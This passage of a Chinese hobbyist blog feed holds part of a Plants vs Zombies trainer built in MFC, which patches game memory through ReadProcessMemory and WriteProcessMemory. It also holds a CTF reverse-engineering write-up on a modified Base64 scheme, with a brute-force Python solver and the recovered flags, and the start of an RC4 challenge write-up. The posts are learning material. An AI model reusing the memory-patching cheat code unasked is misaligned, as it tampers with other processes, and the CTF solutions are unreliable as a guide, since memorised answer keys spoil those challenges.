class="number">0</span>;</span><br><span class="line">DWORD SunShineOffsetFirstValue = <span class="number">0</span>;</span><br><span class="line">DWORD SunShineNum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == ReadProcessMemory(Process, (LPVOID)SUN_SHINE_BASE_ADDR, &amp;SunShineBaseAddressValue, <span class="keyword">sizeof</span>(DWORD), &amp;Size))</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(_T(<span class="string">"获取基址失败\n"</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == ReadProcessMemory(Process, (LPVOID)(SunShineBaseAddressValue + SUN_SHINE_OFFSET_FIRST), &amp;SunShineOffsetFirstValue, <span class="keyword">sizeof</span>(DWORD), &amp;Size))</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(_T(<span class="string">"获取一级偏移失败\n"</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == WriteProcessMemory(Process, (LPVOID)(SunShineOffsetFirstValue + SUN_SHINE_OFFSET_SECOND), &amp;NumOfSum, <span class="keyword">sizeof</span>(DWORD), &amp;Size))</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(_T(<span class="string">"内存写入失败\n"</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">MessageBox(_T(<span class="string">"阳光值修改成功!"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="更新当前阳光值"><a href="#更新当前阳光值" class="headerlink" title="更新当前阳光值"></a>更新当前阳光值</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> CMFCTestDlg::UpdateSunNum()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (Process == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD SunShineBaseAddressValue = <span class="number">0</span>;</span><br><span class="line">DWORD SunShineOffsetFirstValue = <span class="number">0</span>;</span><br><span class="line">DWORD SunShineNum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == ReadProcessMemory(Process, (LPVOID)SUN_SHINE_BASE_ADDR, &amp;SunShineBaseAddressValue, <span class="keyword">sizeof</span>(DWORD), &amp;Size))</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(_T(<span class="string">"获取基址失败\n"</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == ReadProcessMemory(Process, (LPVOID)(SunShineBaseAddressValue + SUN_SHINE_OFFSET_FIRST), &amp;SunShineOffsetFirstValue, <span class="keyword">sizeof</span>(DWORD), &amp;Size))</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(_T(<span class="string">"获取一级偏移失败\n"</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == ReadProcessMemory(Process, (LPVOID)(SunShineOffsetFirstValue + SUN_SHINE_OFFSET_SECOND), &amp;SunShineNum, <span class="keyword">sizeof</span>(DWORD), &amp;Size))</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(_T(<span class="string">"获取二级偏移失败\n"</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">CString ssn;</span><br><span class="line">ssn.Format(_T(<span class="string">"%d"</span>), SunShineNum);</span><br><span class="line">SetDlgItemText(IDC_STATIC1, ssn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="计时器"><a href="#计时器" class="headerlink" title="计时器"></a>计时器</h2><p>每秒刷新一下当前阳光值，这块因为一点小问题研究了半个多小时才搞明白….</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在Resource.h定义一下Timer</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Timer1                          0x01</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//转到xxxxxxDlg.cpp</span></span><br><span class="line">BEGIN_MESSAGE_MAP(CMFCTestDlg, CDialogEx)</span><br><span class="line">......<span class="comment">//此处和下面出现的...表示我写博客的时候没把其他代码放上来,以突出重点</span></span><br><span class="line">ON_WM_TIMER()</span><br><span class="line">END_MESSAGE_MAP()</span><br><span class="line"></span><br><span class="line">BOOL CMFCTestDlg::OnInitDialog()</span><br><span class="line">&#123;</span><br><span class="line">......<span class="comment">//同上</span></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加额外的初始化代码</span></span><br><span class="line">StartTimer();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动timer</span></span><br><span class="line"><span class="keyword">void</span> CMFCTestDlg::StartTimer()</span><br><span class="line">&#123;</span><br><span class="line">SetTimer(Timer1, <span class="number">1000</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线束timer</span></span><br><span class="line"><span class="keyword">void</span> CMFCTestDlg::StopTimer()</span><br><span class="line">&#123;</span><br><span class="line">KillTimer(Timer1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// timer响应函数</span></span><br><span class="line"><span class="keyword">void</span> CMFCTestDlg::OnTimer(UINT nIDEvent)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (nIDEvent) &#123;</span><br><span class="line"><span class="keyword">case</span> Timer1:</span><br><span class="line">UpdateSunNum();<span class="comment">//每1秒刷新一下当前阳光值</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="无CD"><a href="#无CD" class="headerlink" title="无CD"></a>无CD</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> CMFCTestDlg::OnBnClickedCheck1()</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="keyword">if</span> (Process == <span class="literal">NULL</span>) &#123;</span><br><span class="line">MessageBox(_T(<span class="string">"请先点启动!"</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CButton* pBtn = (CButton*)GetDlgItem(IDC_CHECK1);</span><br><span class="line"><span class="keyword">int</span> state = pBtn-&gt;GetCheck();</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == state) &#123;<span class="comment">//未被选中</span></span><br><span class="line">DWORD hasCD = <span class="number">0x0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == WriteProcessMemory(Process, (LPVOID)(NoCD_ADDR), &amp;hasCD, <span class="keyword">sizeof</span>(BYTE), &amp;Size))</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(_T(<span class="string">"设置无CD失败 :( \n"</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">1</span> == state) &#123;<span class="comment">//被选中</span></span><br><span class="line">DWORD NOCD = <span class="number">0x01</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == WriteProcessMemory(Process, (LPVOID)(NoCD_ADDR), &amp;NOCD, <span class="keyword">sizeof</span>(BYTE), &amp;Size))</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(_T(<span class="string">"恢复有CD失败 :( \n"</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x02-效果图"><a href="#0x02-效果图" class="headerlink" title="0x02 效果图"></a>0x02 效果图</h1><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20201222171758.png" alt></p><p>无CD不太好放效果图。。。</p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>这也算是初次接触MFC吧</p><p>感觉好多地方可以优化</p><p>比如 每次都需要重新获取一下基址的值、一级偏移的值…这样多做了许多无用功吧，可以直接把一级偏移的值存入一个全局变量。</p><p>还有一些地方我感觉写的应该不太规范吧</p><p>比如没对句柄进行close….因为我没找到MFC中像Win32图形化编程里面那种switch/case中destory的情况在哪。</p><p>还有些地方并没对非法输入进行处理，没有异常处理之类的。</p><p>今后我会逐步改进的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/71766980_p0.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="开发" scheme="http://liul14n.top/categories/%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>边学习边制作自己的游戏辅助(持续更新中)</title>
    <link href="http://liul14n.top/2020/12/20/%E8%BE%B9%E5%AD%A6%E4%B9%A0%E8%BE%B9%E5%88%B6%E4%BD%9C%E8%87%AA%E5%B7%B1%E7%9A%84%E6%B8%B8%E6%88%8F%E8%BE%85%E5%8A%A9-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/"/>
    <id>http://liul14n.top/2020/12/20/边学习边制作自己的游戏辅助-持续更新中/</id>
    <published>2020-12-20T11:24:56.000Z</published>
    <updated>2022-04-29T06:44:54.468Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码似乎不太对, 请再试试 (•ˇ‸ˇ•)" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="47071212d231eb325b77e353337582cc774fa8eb6397ce66b5926e52cfc022c4"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">本文输入正确密码即可查看,若您确实想看,请与我联系 (๑•⌄•๑)</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      这是一篇加密文章,内容不便公开,如果您确实想看,请与我联系 :)
    
    </summary>
    
      <category term="开发" scheme="http://liul14n.top/categories/%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>Base64_changed(一道比赛逆向题)</title>
    <link href="http://liul14n.top/2020/11/24/Base64-changed-%E4%B8%80%E9%81%93%E6%AF%94%E8%B5%9B%E9%80%86%E5%90%91%E9%A2%98/"/>
    <id>http://liul14n.top/2020/11/24/Base64-changed-一道比赛逆向题/</id>
    <published>2020-11-24T09:08:11.000Z</published>
    <updated>2020-11-27T07:33:10.898Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/84376515_p0.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>被老师安排带着20级的学弟去了聊城市的”第三届山东新一代信息技术创新应用大赛–信息安全攻防赛项”</p><p>做题时，我各个题目时间分配不太合理…或许我应该先帮忙把杂项做完，而不是一直在纠结这个逆向题以及pwn的libc问题…痛失一等奖</p><p>pwn没给libc，用libcsearcher也不管用，导致远程一直没打通，但是事后询问了一位师傅，他直接大胆猜测libc就是2.23的…也确实打通了…看来我还是缺少经验555</p><p>逆向一共3个，前俩没啥亮点，但是第三个挺难搞，虽然分值还没re2高</p><p>赛后趁没课赶紧复现了一下。</p><p>题目附件: <a href="https://github.com/LiuL14n/CTF/blob/main/LC/Base64_changed.zip" target="_blank" rel="noopener">下载地址</a></p><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><p>程序<code>Base64_changed.exe</code>未加任何壳，直接拖入IDA分析。</p><p>来到<code>main</code>函数,其中有一部分符号我已经重命名了。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20201124173036.png" alt></p><p>从main函数来看，程序逻辑非常简单，先进行输入，然后对输入进行一次<code>changed_base64_encode</code>然后再对其结果进行一次<code>GetIndexString</code>操作。</p><p>具体分析一下:</p><h2 id="changed-base64-encode"><a href="#changed-base64-encode" class="headerlink" title="changed_base64_encode"></a>changed_base64_encode</h2><p>起初我并没有对这个函数进行细看，只以为这个函数只是单纯的进行了换了表的base64_encode。</p><p>但赛后复现的时候却发现了很关键的一处!</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20201124173523.png" alt></p><p>这里有个<code>+14</code>，即对索引加了14</p><p>那么为了使我们现有的<code>base64_decode</code>算法能正常运行(或者去直接修改base64_decode算法，但这样比较麻烦)</p><p><strong>需要手动将<code>changed_base64_table</code>进行了一次整体左移14位!</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.rdata:<span class="number">00403160</span> ; <span class="keyword">char</span> changed_base64_table[]</span><br><span class="line">.rdata:00403160 changed_base64_table db 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwxyz',0</span><br></pre></td></tr></table></figure><p>本身这个<code>base64_table</code>就已经是被改过的，这下还要进行移位，也就相当于这次<code>base64_encode</code>真正用的表为<code>OPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN</code></p><h2 id="GetIndexString"><a href="#GetIndexString" class="headerlink" title="GetIndexString"></a>GetIndexString</h2><p>要看懂这个函数在干什么的话，<strong>一定!一定!一定!要先理解base64算法</strong>，网上有很多详解，这里不再叙述。</p><p>这个函数主要就是模拟base64加密时获取索引的操作，</p><p>然后执行 <code>索引的值+32 --&gt; ascii --&gt; 字符</code>(虽然字符在内存中也是以二进制形式存在，但是这样描述大概能方便理解) ， 并把字符依次拼接形成字符串，最后返回这个字符串。</p><p>提取出来主要算法如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v6 = <span class="number">0</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  first = *(_BYTE *)(v7 - <span class="number">1</span>);</span><br><span class="line">  v7 += <span class="number">3</span>;</span><br><span class="line">  second = *(_BYTE *)(v7 - <span class="number">3</span>);</span><br><span class="line">  v5[v6] = (first &gt;&gt; <span class="number">2</span>) + <span class="number">32</span>;</span><br><span class="line">  v5[v6 + <span class="number">1</span>] = ((second &gt;&gt; <span class="number">4</span>) + <span class="number">32</span>) | <span class="number">16</span> * (first &amp; <span class="number">3</span>);</span><br><span class="line">  v10 = thired &gt;&gt; <span class="number">6</span>;</span><br><span class="line">  v5[v6 + <span class="number">3</span>] = (thired &amp; <span class="number">0x3F</span>) + <span class="number">32</span>;</span><br><span class="line">  v5[v6 + <span class="number">2</span>] = (v10 | <span class="number">4</span> * (second &amp; <span class="number">0xF</span>)) + <span class="number">32</span>;</span><br><span class="line">  v6 += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v6 &lt; v15 );</span><br></pre></td></tr></table></figure><p>不过还是有两点非常细节的地方!</p><p><strong>首先</strong>，获取到索引的时候，进行了 <code>+32</code> 的操作</p><p><strong>其次</strong>，<code>v5[v6+1]</code>也就是每组(每四个一组)索引中的第二个索引与每组中的其他三个索引不同。</p><p>其他三个索引，是按照<code>base64_encode</code>算法求出以后再进行<code>+32</code>操作</p><p>但第二个索引</p><p><code>v5[v6 + 1] = ((second &gt;&gt; 4) + 32) | 16 * (first &amp; 3);</code></p><p>是取了每组(每三个一组)待加密字符串中第二个字符的前四位<strong>加上32</strong>以后与<code>16 * (first &amp; 3)</code>进行或运算。</p><p>而并非按照<code>base64_encode</code>原本的算法先求出<code>(second &gt;&gt; 4) | 16 * (first &amp; 3)</code> ，然后再按照程序的意愿进行+32</p><h3 id="隐含的问题"><a href="#隐含的问题" class="headerlink" title="隐含的问题"></a>隐含的问题</h3><p>这样就会导致一个问题:</p><p>说白了就是由于这个程序进行的是<code>((second &gt;&gt; 4) + 32) | 16 * (first &amp; 3)</code>操作，导致每组索引中的第二个索引从左向右第三位(算上为了补齐8位而在开头补的2个0)总会是1。</p><p>因此在逆这个算法的时候需要对其分情况讨论，<strong>讨论还原真正的<code>IndexString</code>的时候是否需要减去32</strong></p><p>下面举两种情况来说明：</p><h4 id="情况一"><a href="#情况一" class="headerlink" title="情况一"></a>情况一</h4><p>假设我们待加密的字符串为<code>Gwn</code></p><p>其二进制表示为<code>01000111 01110111 01101110</code></p><p>用first表示第一个字符，用second表示第二个字符。</p><p><code>((second &gt;&gt; 4) + 32)</code> == <code>100111</code></p><p><code>16 * (first &amp; 3)</code> == <code>110000</code></p><p><code>((second &gt;&gt; 4) + 32) | 16 * (first &amp; 3)</code> == <code>110111</code></p><p>而</p><p><code>((second &gt;&gt; 4))</code> == <code>000111</code></p><p><code>16 * (first &amp; 3)</code> == <code>110000</code></p><p><code>((second &gt;&gt; 4)) | 16 * (first &amp; 3)</code> == <code>110111</code></p><p>通过上述可以发现，如果每组待加密字符串的第一个字符的从左往右第7位为1，也就是获取的每组索引中的第二个索引的从左往右第3位(因为前2位要补0形成8位byte类型)为1</p><p>那么就有<code>((second &gt;&gt; 4) + 32) | 16 * (first &amp; 3)</code>就<strong>等于</strong><code>((second &gt;&gt; 4)) | 16 * (first &amp; 3)</code></p><h4 id="情况二"><a href="#情况二" class="headerlink" title="情况二"></a>情况二</h4><p>但如果我们待加密的字符串为<code>Ewn</code>呢?</p><p>其二进制表示为<code>01000101 01110111 01101110</code></p><p>用first表示第一个字符，用second表示第二个字符。</p><p><code>((second &gt;&gt; 4) + 32)</code> == <code>100111</code></p><p><code>16 * (first &amp; 3)</code> == <code>010000</code></p><p><code>((second &gt;&gt; 4) + 32) | 16 * (first &amp; 3)</code> == <code>110111</code></p><p>而</p><p><code>((second &gt;&gt; 4))</code> == <code>000111</code></p><p><code>16 * (first &amp; 3)</code> == <code>010000</code></p><p><code>((second &gt;&gt; 4)) | 16 * (first &amp; 3)</code> == <code>010111</code> == <code>(((second &gt;&gt; 4) + 32) | 16 * (first &amp; 3))-32</code></p><p>也就是说如果每组待加密字符串的第一个字符的从左往右第7位为0，也就是获取的每组索引中的第二个索引的从左往右第3位(因为前2位要补0形成8位byte类型)为0</p><p>那么就有<code>((second &gt;&gt; 4) + 32) | 16 * (first &amp; 3)</code>就<strong>等于</strong><code>(((second &gt;&gt; 4)) | 16 * (first &amp; 3)) + 32</code></p><h1 id="0x02-思路"><a href="#0x02-思路" class="headerlink" title="0x02 思路"></a>0x02 思路</h1><p>由程序用于对比的字符串<code>8&amp;]Z:&amp;)&amp;=%$T+3%4,6PU:#1M544Q5$,]</code></p><p>想办法还原出真正的<code>IndexString</code>,这里可以考虑爆破,毕竟真正需要爆破的是每组(每四个一组)中的第二个索引中的从左向右第3位(按总共8位来算)，这个字符串长度32，需要爆破8个位置，每个位置2种情况，最多需要爆破2的8次方即256次。爆破成功与否需要看能否正常解密得到flag。</p><p>还原出真正的<code>IndexString</code>以后，也就得到了正确的索引，也就可以根据索引按照真正的base64加密算法得到一个base64串，然后进行base64decode，就得到了我们input进行程序的<code>changed_base64_encode</code>后的结果。</p><p>然后对这个结果进行base64换表decode即可得到flag。</p><h1 id="0x03-解密脚本"><a href="#0x03-解密脚本" class="headerlink" title="0x03 解密脚本"></a>0x03 解密脚本</h1><p>比较菜，目前只想出了用随机数进行爆破和直接套8次for循环的爆破，8次for循环太麻烦了，这里用的随机数。</p><p>应该还有更好的爆破方法吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">s = <span class="string">'8&amp;]Z:&amp;)&amp;=%$T+3%4,6PU:#1M544Q5$,]'</span></span><br><span class="line">base_table = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">changed_base_table = <span class="string">"OPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tmp = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">4</span>):</span><br><span class="line">            tmp += base_table[(ord(s[i])<span class="number">-32</span>)]</span><br><span class="line">            rand = random.choice([<span class="number">0</span>, <span class="number">32</span>])</span><br><span class="line">            tmp += base_table[(ord(s[i+<span class="number">1</span>])-rand)]</span><br><span class="line">            tmp += base_table[(ord(s[i+<span class="number">2</span>])<span class="number">-32</span>)]</span><br><span class="line">            tmp += base_table[(ord(s[i+<span class="number">3</span>])<span class="number">-32</span>)]</span><br><span class="line">        base = tmp.decode(<span class="string">'base64'</span>)</span><br><span class="line">        flag = base64.b64decode(base.translate(string.maketrans(changed_base_table, base_table)))</span><br><span class="line">        <span class="keyword">if</span> flag[<span class="number">0</span>:<span class="number">5</span>] == <span class="string">'flag&#123;'</span> <span class="keyword">and</span> flag[<span class="number">-1</span>] == <span class="string">'&#125;'</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+] Get flag!  flag = '</span> + flag</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>爆破的话能爆破出来好几种解，比如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;BAsE&gt;4aBB64&#125;</span><br><span class="line">flag&#123;BAsE&gt;4_BB64&#125;</span><br><span class="line">flag&#123;BAsE64aBB64&#125;</span><br><span class="line">flag&#123;BAsE64_BB64&#125;</span><br></pre></td></tr></table></figure><p>经过测试，这些都能通过程序的验证。</p><h1 id="0x04-写在最后"><a href="#0x04-写在最后" class="headerlink" title="0x04 写在最后"></a>0x04 写在最后</h1><p>主办方在群里发过一段解密脚本，但是程序strcmp的那个字符串与这个程序有些许差别。</p><p>大概这个程序是经过改编的，而且我感觉上面分析的那个+32的问题，应该是改编时没注意括号导致的?</p><p>不过这道题目还是挺有意思的，考察对base64算法的具体理解，单单会用Python或者其他语言里面现有的encode与decode还是不够的。</p><p><strong>如果有人看到了这篇博客并且想到了更好的爆破方法，希望能够教教弟弟。</strong></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/illust_74791242_20190810_124117.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/84376515_p0.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://liul14n.top/categories/%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>忽略细节导致耗时较多的一道逆向题Babyalgo</title>
    <link href="http://liul14n.top/2020/11/19/%E5%BF%BD%E7%95%A5%E7%BB%86%E8%8A%82%E5%AF%BC%E8%87%B4%E8%80%97%E6%97%B6%E8%BE%83%E5%A4%9A%E7%9A%84%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98Babyalgo/"/>
    <id>http://liul14n.top/2020/11/19/忽略细节导致耗时较多的一道逆向题Babyalgo/</id>
    <published>2020-11-19T10:14:31.000Z</published>
    <updated>2020-11-19T11:01:56.279Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/1.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>早闻Nu1L出了一本《从0到1：CTFer成长之路》</p><p>今天逛BUU的时候发现多了一栏N1BOOK</p><p>点开做一下，发现第二题竟然被卡住了，输出的flag后面有不可见字符而且后五六个字符似乎没啥含义</p><p>折腾挺大一会才发现原来是因为忽略了一个细节…</p><p>耗时比我想象中的多，就当吸取不仔细的教训吧…</p><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><p>来到main函数，可以看到程序定义了一个数组</p><p><strong>但是这里有一个导致我后期输出的flag一直有问题的细节</strong></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20201119182531.png" alt></p><p>可以看到…前一个还是<code>[rbp+var_2A]</code>，下一个就变成了<code>[rbp+var_28]</code>，也就是说<code>[rbp+var_29]</code>不见了…</p><p>后期我还纳闷…明明flag要求长度45,但为什么这个数组只有44长度…然后自己在最后补了个0…</p><p>根据常识可知<code>[rbp+var_29] = 0</code></p><p>继续分析，进行了一番变量、函数重命名以后得到如下反汇编结果</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20201119183123.png" alt></p><p>这是后来才知道的这个函数是RC4算法函数……</p><p>由于第一次见这个算法的时候没想起来这是RC4，我直接去看相关算法然后逆的</p><p>进去看看RC4函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">RC4</span><span 